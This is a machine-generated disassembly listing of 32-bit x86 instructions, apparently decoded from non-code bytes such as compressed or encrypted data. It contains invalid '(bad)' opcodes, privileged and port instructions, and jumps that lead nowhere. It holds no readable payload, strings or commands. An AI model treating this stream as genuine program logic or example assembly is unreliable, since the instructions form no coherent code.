  422235:	outs   dx,BYTE PTR ds:[esi]
  422236:	scas   al,BYTE PTR es:[edi]
  422237:	push   edx
  422238:	push   eax
  422239:	mov    eax,0xb93cd8ab
  42223e:	stc    
  42223f:	pop    ds
  422240:	adc    ah,BYTE PTR [ebx-0x23]
  422243:	add    al,0x56
  422245:	mov    ah,0xad
  422247:	icebp  
  422248:	cmp    esp,eax
  42224a:	mov    ds:0x49df29a6,eax
  42224f:	leave  
  422250:	call   0x834c4069
  422255:	pop    edi
  422256:	cmp    ah,BYTE PTR [ebp-0x4c48468b]
  42225c:	loopne 0x422263
  42225e:	mul    BYTE PTR [ebp+ecx*1+0x2e31b98b]
  422265:	repz (bad) 
  422267:	rol    DWORD PTR [ebp+0x7b5972f0],1
  42226d:	test   eax,0xddce2f15
  422272:	int3   
  422273:	pushf  
  422274:	loope  0x42228b
  422276:	xchg   ebp,eax
  422277:	neg    bh
  422279:	add    BYTE PTR [eax+0x42cf8d4a],dl
  42227f:	dec    eax
  422280:	adc    edi,DWORD PTR [ebx]
  422282:	jae    0x4222c8
  422284:	addr16 push ebp
  422286:	retf   0x6cb2
  422289:	aam    0xda
  42228b:	iret   
  42228c:	enter  0x67dc,0x52
  422290:	push   ecx
  422291:	mov    ds:0x415504ca,eax
  422296:	(bad)  
  422297:	je     0x422223
  422299:	test   DWORD PTR [ebp-0x51],eax
  42229c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42229d:	xor    BYTE PTR [edx+eax*4],0xca
  4222a1:	xchg   ebx,eax
  4222a2:	sub    al,0xb5
  4222a4:	rep lods eax,DWORD PTR ds:[esi]
  4222a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222a7:	loopne 0x4222fd
  4222a9:	mov    ds:0x888b288f,al
  4222ae:	outs   dx,DWORD PTR ds:[esi]
  4222af:	cli    
  4222b0:	push   edi
  4222b1:	push   ebx
  4222b2:	cmp    dl,BYTE PTR [edx+0x51]
  4222b5:	and    edx,0xffffff80
  4222b8:	inc    edi
  4222b9:	stos   DWORD PTR es:[edi],eax
  4222ba:	xchg   esp,eax
  4222bb:	adc    al,BYTE PTR [ecx-0x60]
  4222be:	pop    eax
  4222bf:	cmp    eax,0x3d63fd23
  4222c4:	xor    BYTE PTR [esi+0xfde7f46],ch
  4222ca:	push   cs
  4222cb:	std    
  4222cc:	dec    eax
  4222cd:	sub    eax,0x398b126
  4222d2:	add    ch,BYTE PTR [ecx-0xaf76ae5]
  4222d8:	cmp    esi,DWORD PTR ds:0xa68f56e3
  4222de:	push   ecx
  4222df:	xor    BYTE PTR [ecx+0x17],ah
  4222e2:	or     edi,esi
  4222e4:	jl     0x4222e5
  4222e6:	inc    esp
  4222e7:	stos   DWORD PTR es:[edi],eax
  4222e8:	bound  ebp,QWORD PTR [edi]
  4222ea:	imul   ebx,DWORD PTR [edx+edi*4+0x3d],0x0
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422363:	rcr    DWORD PTR [ecx-0x26],cl
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	ja     0x42230e
  422370:	outs   dx,BYTE PTR ds:[esi]
  422371:	fsin   
  422373:	not    DWORD PTR [ecx-0x3df7ef1]
  422379:	clc    
  42237a:	dec    ebp
  42237b:	pop    ebx
  42237c:	jle    0x42234e
  42237e:	add    al,BYTE PTR [ecx]
  422380:	scas   eax,DWORD PTR es:[edi]
  422381:	cld    
  422382:	popa   
  422383:	test   bh,dh
  422385:	jns    0x4223de
  422387:	adc    eax,0x82cdffef
  42238c:	jo     0x4223d1
  42238e:	push   0x57
  422390:	jbe    0x422342
  422392:	inc    esp
  422393:	in     al,dx
  422394:	mov    edx,0x9afe4412
  422399:	pop    ds
  42239a:	sbb    BYTE PTR [ecx+0x4875fb21],0x43
  4223a1:	lods   eax,DWORD PTR ds:[esi]
  4223a2:	pop    edx
  4223a3:	adc    BYTE PTR [edi+0x27],0xac
  4223a7:	dec    edi
  4223a8:	lock mov al,0xb
  4223ab:	(bad)
  4223ae:	jb     0x4223f1
  4223b0:	xchg   DWORD PTR [edi-0x46944b38],edi
  4223b6:	or     al,0x67
  4223b8:	rsqrtps xmm2,XMMWORD PTR [ebp+0x38]
  4223bc:	into   
  4223bd:	jae    0x4223da
  4223bf:	std    
  4223c0:	push   0x2ed57e7e
  4223c5:	mov    ch,0x97
  4223c7:	adc    BYTE PTR [esi+eiz*8-0x3e0b20b7],al
  4223ce:	outs   dx,DWORD PTR ds:[esi]
  4223cf:	test   BYTE PTR gs:[esi],bh
  4223d2:	jp     0x422432
  4223d4:	jmp    0xba9662fc
  4223d9:	adc    DWORD PTR [ecx-0xd],ebx
  4223dc:	int    0x24
  4223de:	mov    bh,0x64
  4223e0:	mov    edi,0xa00ca280
  4223e5:	sti    
  4223e6:	sahf   
  4223e7:	hlt    
  4223e8:	aas    
  4223e9:	mov    DWORD PTR [edx+0x40abc768],esi
  4223ef:	call   0x5e1e0b0f
  4223f4:	pop    edx
  4223f5:	xor    bl,BYTE PTR [ebp+0x663f4d67]
  4223fb:	xchg   edx,eax
  4223fc:	es jg  0x42239b
  4223ff:	sar    BYTE PTR [ecx+0x5e74e754],1
  422405:	push   esi
  422406:	shl    BYTE PTR [esp+ebp*2+0x24],1
  42240a:	popf   
  42240b:	jmp    0xf2c0:0x84664596
  422412:	outs   dx,DWORD PTR ds:[esi]
  422413:	xchg   ebp,eax
  422414:	sahf   
  422415:	loope  0x4223d5
  422417:	push   cs
  422418:	in     eax,0x35
  42241a:	pop    edx
  42241b:	aaa    
  42241c:	mov    ch,0x29
  42241e:	xchg   BYTE PTR [edi],cl
  422420:	sbb    eax,DWORD PTR [esi+0x42]
  422423:	mov    eax,0xbcfbfe92
  422428:	in     al,dx
  422429:	aaa    
  42242a:	test   eax,0x1333ef92
  42242f:	xor    al,dl
  422431:	fistp  WORD PTR [edx+0x10]
  422434:	mov    bl,0x5f
  422436:	pushf  
  422437:	xor    al,0x8f
  422439:	fwait
  42243a:	hlt    
  42243b:	inc    eax
  42243c:	inc    edi
  42243d:	cli    
  42243e:	daa    
  42243f:	fsub   DWORD PTR [esi]
  422441:	push   0x43
  422443:	retf   
  422444:	shl    cl,0xf3
  422447:	push   esp
  422448:	ins    DWORD PTR es:[edi],dx
  422449:	arpl   WORD PTR [esp+eax*8],cx
  42244c:	daa    
  42244d:	inc    esi
  42244e:	pop    eax
  42244f:	outs   dx,DWORD PTR ds:[esi]
  422450:	mov    ds:0xf1512335,eax
  422455:	es push 0xbc30a583
  42245b:	xchg   edi,eax
  42245c:	pop    ss
  42245d:	dec    eax
  42245e:	ja     0x42245a
  422460:	dec    edx
  422461:	mov    eax,ds:0x2e4f9d66
  422466:	pop    edx
  422467:	ja     0x4223f4
  422469:	and    al,0xce
  42246b:	in     al,dx
  42246c:	and    edx,DWORD PTR [eax+eax*1]
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	xor    ecx,edi
  4224e4:	ret    
  4224e5:	cmp    BYTE PTR [edi+0x70],ah
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	add    BYTE PTR [ecx],al
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	leave  
  4224ef:	xor    ebp,DWORD PTR [edx]
  4224f1:	and    eax,0xab1b933b
  4224f6:	fucomi st,st(3)
  4224f8:	cmp    eax,DWORD PTR [edi+edi*2-0x4d]
  4224fc:	aas    
  4224fd:	jmp    0xc1dac797
  422502:	pop    edx
  422503:	imul   esi,DWORD PTR [ebp+eax*1+0x26],0xffffffe8
  422508:	stos   DWORD PTR es:[edi],eax
  422509:	sti    
  42250a:	das    
  42250b:	shl    DWORD PTR ds:0x57f513f4,0x44
  422512:	in     eax,0x31
  422514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422515:	jo     0x422580
  422517:	inc    ecx
  422518:	lods   al,BYTE PTR ds:[esi]
  422519:	and    BYTE PTR [edx],dl
  42251b:	dec    esi
  42251c:	je     0x4224c3
  42251e:	fdivr  st(7),st
  422520:	fisubr WORD PTR [ecx+ebp*4+0x5984fb07]
  422527:	xchg   dl,dh
  422529:	mov    ch,0x18
  42252b:	cmp    BYTE PTR [edi-0x4014544d],al
  422531:	mov    esi,DWORD PTR [ecx]
  422533:	cmp    al,BYTE PTR [edi]
  422535:	add    DWORD PTR [edi-0x201133c4],edi
  42253b:	dec    edx
  42253c:	cli    
  42253d:	pop    ss
  42253e:	sahf   
  42253f:	pop    ebx
  422540:	jae    0x42250f
  422542:	(bad)  
  422543:	fsubr  QWORD PTR [ebx+0x3b]
  422546:	xchg   edi,ebp
  422548:	xor    dl,0xd4
  42254b:	loope  0x422556
  42254d:	mov    esi,0xaa46b617
  422552:	sar    DWORD PTR [edx+0x7f2814c0],1
  422558:	cld    
  422559:	jns    0x4225bb
  42255b:	pop    ebx
  42255c:	push   esp
  42255d:	fsub   QWORD PTR [edi]
  42255f:	ins    BYTE PTR es:[edi],dx
  422560:	mov    BYTE PTR [ebx],bl
  422562:	pop    esi
  422563:	jle    0x4224e6
  422565:	cmp    DWORD PTR [ecx],0xda63d759
  42256b:	rcl    DWORD PTR [esi+0x4dff0467],1
  422571:	scas   al,BYTE PTR es:[edi]
  422572:	test   al,0x9e
  422574:	add    BYTE PTR [edx-0x1d],ah
  422577:	mov    eax,0x2746f29a
  42257c:	int    0x63
  42257e:	inc    edi
  42257f:	test   DWORD PTR [ebp+eax*4-0x72c7e990],esp
  422586:	ror    BYTE PTR [eax],0xa3
  422589:	js     0x4225ab
  42258b:	jbe    0x422521
  42258d:	repz pop edi
  42258f:	mov    bh,0xd4
  422591:	sub    BYTE PTR [di+0x7e13],ah
  422596:	jp     0x422544
  422598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422599:	fdivrp st(2),st
  42259b:	daa    
  42259c:	mov    DWORD PTR [eax-0x6e],eax
  42259f:	repz call 0x1878:0x1b56244b
  4225a7:	sbb    al,0x5e
  4225a9:	add    eax,0xb2484e1b
  4225ae:	push   eax
  4225af:	dec    edx
  4225b0:	push   0xb823cfd1
  4225b5:	push   edx
  4225b6:	icebp  
  4225b7:	divps  xmm6,XMMWORD PTR [ecx-0x54]
  4225bb:	fistp  WORD PTR [eax-0x14]
  4225be:	repz int3 
  4225c0:	aam    0xd
  4225c2:	push   eax
  4225c3:	(bad)  
  4225c4:	imul   esp,DWORD PTR [edx],0xffffff9a
  4225c7:	jbe    0x4225ef
  4225c9:	pop    esp
  4225ca:	test   BYTE PTR [edi-0x5a],bl
  4225cd:	cmp    DWORD PTR [esi-0x7f],ebx
  4225d0:	lock inc ecx
  4225d2:	pop    ds
  4225d3:	and    ebx,DWORD PTR ss:[edi]
  4225d6:	aaa    
  4225d7:	test   DWORD PTR [ebx-0x60],ebp
  4225da:	inc    edx
  4225db:	xchg   esp,eax
  4225dc:	pop    edx
  4225dd:	or     dl,al
  4225df:	jmp    0x4225d6
  4225e1:	les    eax,FWORD PTR [esi-0x5c]
  4225e4:	mov    cl,0x61
  4225e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e7:	aam    0x3
  4225e9:	or     al,0x3a
  4225eb:	outs   dx,DWORD PTR ds:[esi]
  4225ec:	jnp    0x42261b
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx+0x32a0a2f8]
  422664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422665:	mov    esp,DWORD PTR [edi+0x71]
  422668:	add    DWORD PTR [eax],eax
  42266a:	add    BYTE PTR [ecx],al
  42266c:	add    BYTE PTR [eax],al
  42266e:	ror    DWORD PTR [eax],0xe8
  422671:	or     edi,edx
  422673:	add    dl,ch
  422675:	push   eax
  422676:	mov    ds:0xf31c69e5,eax
  42267b:	ins    DWORD PTR es:[edi],dx
  42267c:	mov    esi,0xade41f88
  422681:	push   esp
  422682:	arpl   WORD PTR [ebx-0x66a5ee8e],bp
  422688:	mov    edx,0x909607ee
  42268d:	xchg   ecx,eax
  42268e:	fadd   st,st(0)
  422690:	aaa    
  422691:	adc    al,0x68
  422693:	add    al,0x1c
  422695:	or     al,0xc0
  422697:	adc    eax,0x9be16726
  42269c:	shr    BYTE PTR [esi],cl
  42269e:	mov    ecx,0x9873219e
  4226a3:	lods   al,BYTE PTR ds:[esi]
  4226a4:	mov    dh,0xd1
  4226a6:	and    eax,0xcf0a8e87
  4226ab:	in     al,dx
  4226ac:	rcr    ch,0x8e
  4226af:	push   edi
  4226b0:	out    0x97,al
  4226b2:	ror    BYTE PTR [edi],1
  4226b4:	cs cli 
  4226b6:	xchg   edx,eax
  4226b7:	sbb    ah,BYTE PTR [ecx]
  4226b9:	pop    eax
  4226ba:	dec    BYTE PTR [edi-0x100ffe08]
  4226c0:	xor    DWORD PTR [eax-0x27faf759],edx
  4226c6:	jne    0x422731
  4226c8:	mov    bh,0xeb
  4226ca:	ds mov dl,0xf7
  4226cd:	push   ss
  4226ce:	and    esp,ecx
  4226d0:	mov    eax,ds:0xa0faceb0
  4226d5:	stos   DWORD PTR es:[edi],eax
  4226d6:	call   0x35cdafca
  4226db:	aaa    
  4226dc:	jle    0x422716
  4226de:	pop    eax
  4226df:	inc    edx
  4226e0:	stos   DWORD PTR es:[edi],eax
  4226e1:	lahf   
  4226e2:	fsubr  QWORD PTR [eax+eiz*2+0x5f]
  4226e6:	test   DWORD PTR [edi],esp
  4226e8:	jbe    0x422730
  4226ea:	dec    eax
  4226eb:	jae    0x42272d
  4226ed:	push   es
  4226ee:	jb     0x422684
  4226f0:	inc    esp
  4226f1:	pop    es
  4226f2:	stos   BYTE PTR es:[edi],al
  4226f3:	ss iret 
  4226f5:	lea    esi,[edx+0x44]
  4226f8:	sub    DWORD PTR [esp+ebp*8],ecx
  4226fb:	cmp    BYTE PTR [ebx-0x22f727a2],0xc2
  422702:	pcmpeqb mm2,QWORD PTR [ebp-0x183083ed]
  422709:	or     DWORD PTR [ebx],esi
  42270b:	adc    DWORD PTR [esi],ebp
  42270d:	fcomi  st,st(4)
  42270f:	int    0x94
  422711:	dec    ebx
  422712:	(bad)  [ebx]
  422714:	or     al,0x54
  422716:	jnp    0x422724
  422718:	push   ecx
  422719:	or     al,BYTE PTR [edx]
  42271b:	nop
  42271c:	jnp    0x4226ec
  42271e:	lods   eax,DWORD PTR ds:[esi]
  42271f:	xor    al,0x3c
  422721:	arpl   WORD PTR [ecx-0x47],di
  422724:	mov    esp,0xb95504ae
  422729:	mov    eax,0xadfc0a5b
  42272e:	call   0x13:0x9c6b2b97
  422735:	mov    edi,0xb3156aff
  42273a:	outs   dx,BYTE PTR ds:[esi]
  42273b:	adc    BYTE PTR [ebp+ebx*1+0x1a],al
  42273f:	loopne 0x4227af
  422741:	sbb    DWORD PTR [ecx],ecx
  422743:	sbb    eax,0x831438e7
  422748:	rcr    edi,1
  42274a:	xor    edi,esi
  42274c:	add    DWORD PTR [ecx-0x689bebe7],0x1e20ad3
  422756:	(bad)  
  422757:	das    
  422758:	jp     0x422746
  42275a:	mov    dh,0x8f
  42275c:	pusha  
  42275d:	ret    0xb6d2
  422760:	sahf   
  422761:	push   ds
  422762:	fimul  DWORD PTR [ecx]
  422764:	int    0x71
  422766:	dec    edi
  422767:	add    eax,DWORD PTR [ebx+0x799f0215]
  42276d:	mov    al,0x0
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xbd7f01c8
  4227e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e4:	mov    es,WORD PTR [ebp+0x17267]
  4227ea:	add    BYTE PTR [ecx],al
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	retf   
  4227ef:	rcr    DWORD PTR [edi+eiz*4+0x4a39b29d],1
  4227f6:	or     BYTE PTR [ecx+0x9],0xdb
  4227fa:	xor    dh,bh
  4227fc:	std    
  4227fd:	pop    ecx
  4227fe:	and    ebp,DWORD PTR [ecx-0x553ce9ca]
  422804:	adc    DWORD PTR [esi-0x44cd3090],eax
  42280a:	mov    ds:0xf4bc7865,al
  42280f:	xor    ebx,DWORD PTR [esi+0x1e]
  422812:	cmp    eax,ebx
  422814:	out    0x39,eax
  422816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422817:	cwde   
  422818:	xor    eax,esp
  42281a:	or     BYTE PTR [ecx+0x5d6d15bc],0x26
  422821:	sbb    al,0xe1
  422823:	call   0xda2b:0x7dc8d49e
  42282a:	xor    eax,0x124da399
  42282f:	mul    DWORD PTR [edx]
  422831:	mov    ecx,0xc733b315
  422836:	test   DWORD PTR [edi+0x59807c12],ebp
  42283c:	enter  0x3c59,0xca
  422840:	sbb    al,dh
  422842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422843:	fisttp QWORD PTR [edx]
  422845:	ins    BYTE PTR es:[edi],dx
  422846:	imul   ecx,DWORD PTR [esi],0xbf367f8f
  42284c:	mov    WORD PTR [esi-0x373959a1],ss
  422852:	fs mov dh,0xa7
  422855:	and    eax,0x4ccd807e
  42285a:	in     al,dx
  42285b:	mov    eax,0xd2e33a4a
  422860:	imul   edx,edi,0xd515d007
  422866:	and    eax,0x8bb84589
  42286b:	mov    eax,ecx
  42286d:	and    esi,DWORD PTR [edi+0x59]
  422870:	xor    eax,0x61f086c8
  422875:	das    
  422876:	mov    bl,0xe6
  422878:	xlat   BYTE PTR ds:[ebx]
  422879:	mov    ds:0x76777933,al
  42287e:	mov    WORD PTR [ebx-0x4afa198],cs
  422884:	push   edi
  422885:	scas   eax,DWORD PTR es:[edi]
  422886:	mov    esi,0x30b6ab21
  42288b:	or     BYTE PTR [edx],bl
  42288d:	and    ebx,DWORD PTR [ecx+0x3]
  422890:	inc    esi
  422891:	adc    DWORD PTR [ebx-0x4a],edi
  422894:	push   ss
  422895:	test   eax,0x4aebb5f
  42289a:	popa   
  42289b:	out    0x55,eax
  42289d:	mov    edi,DWORD PTR [edx+0x6d0a4295]
  4228a3:	sbb    al,0xbb
  4228a5:	retf   0x14e
  4228a8:	xor    esi,edi
  4228aa:	das    
  4228ab:	jecxz  0x422855
  4228ad:	outs   dx,BYTE PTR es:[esi]
  4228af:	scas   eax,DWORD PTR es:[edi]
  4228b0:	push   esp
  4228b1:	sub    BYTE PTR [eax-0xf],0x4
  4228b5:	fist   DWORD PTR ds:0x663a344f
  4228bb:	loop   0x42286c
  4228bd:	and    BYTE PTR [ecx+0x4a],bh
  4228c0:	cdq    
  4228c1:	dec    eax
  4228c2:	call   0x45b85200
  4228c7:	mov    ds:0x51386af2,al
  4228cc:	out    dx,al
  4228cd:	mov    eax,0xbb1c978b
  4228d2:	int3   
  4228d3:	jb     0x422858
  4228d5:	inc    esi
  4228d6:	jbe    0x42286a
  4228d8:	inc    ebx
  4228d9:	xor    eax,0xe9ec3727
  4228de:	loop   0x4228f0
  4228e0:	lods   al,BYTE PTR ds:[esi]
  4228e1:	cmp    ebp,DWORD PTR [edi+0x222d882b]
  4228e7:	pop    esi
  4228e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228e9:	sbb    al,0x25
  4228eb:	xchg   ebp,eax
  4228ec:	sar    DWORD PTR [edi+0x0],cl
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x422907
  422963:	inc    edi
  422964:	adc    eax,0x17367df
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [ebp-0x32],bl
  422970:	and    BYTE PTR [ecx+0xe],dl
  422973:	popf   
  422974:	cmp    eax,0xc2b5832f
  422979:	inc    eax
  42297a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42297b:	cmp    esi,0xffffffbc
  42297e:	mov    BYTE PTR [edx],ah
  422980:	sub    eax,0x21f3c121
  422985:	sbb    dl,BYTE PTR [eax+0x74615d58]
  42298b:	in     al,0xd3
  42298d:	loope  0x4229fb
  42298f:	in     al,0x23
  422991:	xor    al,0x5
  422993:	retf   
  422994:	fsub   QWORD PTR [ebp-0x13]
  422997:	adc    BYTE PTR ds:0x1517ccf2,cl
  42299d:	push   0x4f
  42299f:	loope  0x4229f5
  4229a1:	sub    al,ah
  4229a3:	sub    ecx,eax
  4229a5:	(bad)  
  4229a6:	in     eax,0x50
  4229a8:	and    DWORD PTR [edi],ecx
  4229aa:	sbb    al,0x94
  4229ac:	mov    ?,WORD PTR [esi+0x4a348942]
  4229b2:	test   eax,0x43b52036
  4229b7:	push   cs
  4229b8:	or     DWORD PTR [edi],ebx
  4229ba:	pop    cx
  4229bc:	push   eax
  4229bd:	add    ah,BYTE PTR [esi-0x387b5e56]
  4229c3:	mov    ah,0x4d
  4229c5:	pop    ebp
  4229c6:	mov    dl,0x5
  4229c8:	push   0xb6e0e08
  4229cd:	xchg   ebx,eax
  4229ce:	test   BYTE PTR [eax-0x687b158a],dl
  4229d4:	adc    dh,BYTE PTR [eax]
  4229d6:	mov    bl,0x3a
  4229d8:	cwde   
  4229d9:	mov    dh,0x84
  4229db:	inc    esp
  4229dc:	jb     0x422a4e
  4229de:	fist   WORD PTR ds:0x1ef12c60
  4229e4:	inc    eax
  4229e5:	nop
  4229e6:	push   ecx
  4229e7:	inc    ecx
  4229e8:	and    dh,BYTE PTR [ebx+0xa4d48b9]
  4229ee:	icebp  
  4229ef:	shr    ebp,cl
  4229f1:	pop    ecx
  4229f2:	xchg   edx,eax
  4229f3:	push   ss
  4229f4:	pop    ebx
  4229f5:	(bad)  
  4229f6:	into   
  4229f7:	(bad)  
  4229f8:	stc    
  4229f9:	mov    esi,0xf4958f0
  4229fe:	mov    eax,0xa2b85526
  422a03:	inc    esp
  422a04:	xchg   esp,eax
  422a05:	xchg   ebp,eax
  422a06:	nop
  422a07:	jae    0x422a0d
  422a09:	cmp    al,0x1b
  422a0b:	and    bh,al
  422a0d:	inc    edi
  422a0e:	stos   BYTE PTR es:[edi],al
  422a0f:	sbb    esi,DWORD PTR [eax]
  422a11:	push   eax
  422a12:	pop    esp
  422a13:	lods   eax,DWORD PTR ds:[esi]
  422a14:	arpl   WORD PTR [eax+0x4c],dx
  422a17:	dec    esp
  422a18:	lea    edi,[eax-0x7d]
  422a1b:	cli    
  422a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a1d:	mov    BYTE PTR [esi],cl
  422a1f:	inc    edi
  422a20:	cli    
  422a21:	dec    edi
  422a22:	mov    ch,0x3a
  422a24:	pop    ebp
  422a25:	jg     0x422a07
  422a27:	and    ecx,eax
  422a29:	mov    al,0x7a
  422a2b:	xor    eax,0xa2a3a514
  422a30:	adc    eax,0x8f56ffe7
  422a35:	mov    edx,?
  422a37:	sahf   
  422a38:	mov    ecx,0xaf3d014
  422a3d:	sub    DWORD PTR fs:[esi],ecx
  422a40:	dec    edx
  422a41:	push   ecx
  422a42:	mov    ebx,0xc02d0866
  422a47:	test   eax,0xef0bcaf0
  422a4c:	cmp    ax,ax
  422a4f:	dec    edx
  422a50:	inc    eax
  422a51:	cmp    edx,edx
  422a53:	jne    0x422a9f
  422a55:	jb     0x4229f4
  422a57:	ret    0x4010
  422a5a:	cdq    
  422a5b:	int    0xe7
  422a5d:	mov    edi,0xcefb3276
  422a62:	push   ecx
  422a63:	fdivr  QWORD PTR [edi]
  422a65:	push   ss
  422a66:	cwde   
  422a67:	xor    BYTE PTR [edx],dh
  422a69:	xchg   al,bl
  422a6b:	dec    ebp
  422a6c:	lea    eax,[eax+eax*1+0x0]
	...
  422ad3:	add    BYTE PTR [eax],al
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	aad    0x6b
  422ae4:	add    eax,0x17467fe
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [eax],ch
  422aef:	pop    edx
  422af0:	and    ch,BYTE PTR [esi-0x53]
  422af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422af4:	jae    0x422af7
  422af6:	lods   al,BYTE PTR es:[esi]
  422af8:	sub    BYTE PTR [eax-0x1d],dl
  422afb:	sub    BYTE PTR [ebp-0x623c5e5b],ah
  422b01:	push   esi
  422b02:	mov    eax,ds:0xba3d49fd
  422b07:	and    ah,dh
  422b09:	je     0x422abf
  422b0b:	push   ecx
  422b0c:	ficom  WORD PTR [ebx-0x7b]
  422b0f:	fs retf 
  422b11:	lds    esi,FWORD PTR [esi-0x3c]
  422b14:	cmc    
  422b15:	das    
  422b16:	xor    DWORD PTR [esi+0x5de74c12],ebp
  422b1c:	pop    edi
  422b1d:	lahf   
  422b1e:	xor    BYTE PTR [eax+0x238ef149],dh
  422b24:	jb     0x422b45
  422b26:	xor    eax,0x6b8bffbf
  422b2b:	mov    esp,esi
  422b2d:	push   eax
  422b2e:	ret    
  422b2f:	dec    edx
  422b30:	sbb    ah,0x7e
  422b33:	ss jmp 0x422b08
  422b36:	xchg   esi,edx
  422b38:	jae    0x422b35
  422b3a:	inc    ebx
  422b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b3c:	arpl   WORD PTR [edx],dx
  422b3e:	retf   0xcca5
  422b41:	xor    edx,DWORD PTR [edi+0x32]
  422b44:	aam    0x61
  422b46:	loope  0x422b8f
  422b48:	dec    esp
  422b49:	jmp    0x422b8b
  422b4b:	in     eax,0x7b
  422b4d:	loopne 0x422b02
  422b4f:	repnz mov DWORD PTR [ecx-0x11],eax
  422b53:	jne    0x422b1a
  422b55:	mov    ds:0x77895cb9,eax
  422b5a:	data16 sub al,0xb9
  422b5d:	loop   0x422b62
  422b5f:	sub    ecx,ebp
  422b61:	mov    cl,0x1b
  422b63:	div    DWORD PTR [edi-0x3d]
  422b66:	repnz scas al,BYTE PTR es:[edi]
  422b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b69:	aas    
  422b6a:	mov    edi,0xfee645d5
  422b6f:	fidivr WORD PTR es:[ecx]
  422b72:	add    BYTE PTR [ebp+0x50],bh
  422b75:	js     0x422b45
  422b77:	sub    al,0xb0
  422b79:	mov    cl,0xb3
  422b7b:	xor    bl,dh
  422b7d:	cld    
  422b7e:	and    al,0xee
  422b80:	or     al,0xc5
  422b82:	push   0xd7e151f5
  422b87:	cmp    dl,ch
  422b89:	pop    ebx
  422b8a:	push   es
  422b8b:	in     eax,0x83
  422b8d:	stc    
  422b8e:	int3   
  422b8f:	jno    0x422bad
  422b91:	rcr    DWORD PTR [esi-0x1572392c],0x1b
  422b98:	nop
  422b99:	enter  0x69c1,0x97
  422b9d:	cmp    BYTE PTR [ecx],dl
  422b9f:	add    BYTE PTR cs:[ecx+0x5e265c65],cl
  422ba6:	js     0x422b39
  422ba8:	push   ds
  422ba9:	dec    edx
  422baa:	push   ds
  422bab:	pusha  
  422bac:	fwait
  422bad:	pushf  
  422bae:	jg     0x422bbb
  422bb0:	(bad)  
  422bb1:	xor    BYTE PTR [edi],ch
  422bb3:	xchg   edx,eax
  422bb4:	iret   
  422bb5:	push   esi
  422bb6:	sar    BYTE PTR [esi+ebx*2+0x7],cl
  422bba:	mov    ch,0xad
  422bbc:	call   0x32e0311c
  422bc1:	or     BYTE PTR [ecx],bh
  422bc3:	les    ebx,FWORD PTR [esi-0x10f58d7d]
  422bc9:	pop    edx
  422bca:	dec    esp
  422bcb:	lods   al,BYTE PTR ds:[esi]
  422bcc:	sbb    ah,BYTE PTR [esi+ebx*4-0x46b74adf]
  422bd3:	xor    BYTE PTR [edi],cl
  422bd5:	pushf  
  422bd6:	xor    eax,0x5613d9a4
  422bdb:	xchg   edx,eax
  422bdc:	cmp    eax,0xdd606c24
  422be1:	or     ch,BYTE PTR [edx+0x46]
  422be4:	inc    ebx
  422be5:	add    eax,0x2e7f3f21
  422bea:	mov    edi,DWORD PTR [edi+0x2]
  422bed:	xchg   edx,eax
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x77ccb264]
  422c64:	cmp    BYTE PTR [ecx+0x67],cl
  422c67:	jne    0x422c6a
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    BYTE PTR [eax+0x439daf92],dh
  422c73:	sti    
  422c74:	addr16 pusha 
  422c76:	pop    es
  422c77:	das    
  422c78:	xor    eax,0x2a0d3d88
  422c7d:	lods   al,BYTE PTR ds:[esi]
  422c7e:	push   esp
  422c7f:	push   eax
  422c80:	shl    DWORD PTR [ebx+0x4d],cl
  422c83:	ins    DWORD PTR es:[edi],dx
  422c84:	pop    ebp
  422c85:	xor    ecx,DWORD PTR [eax]
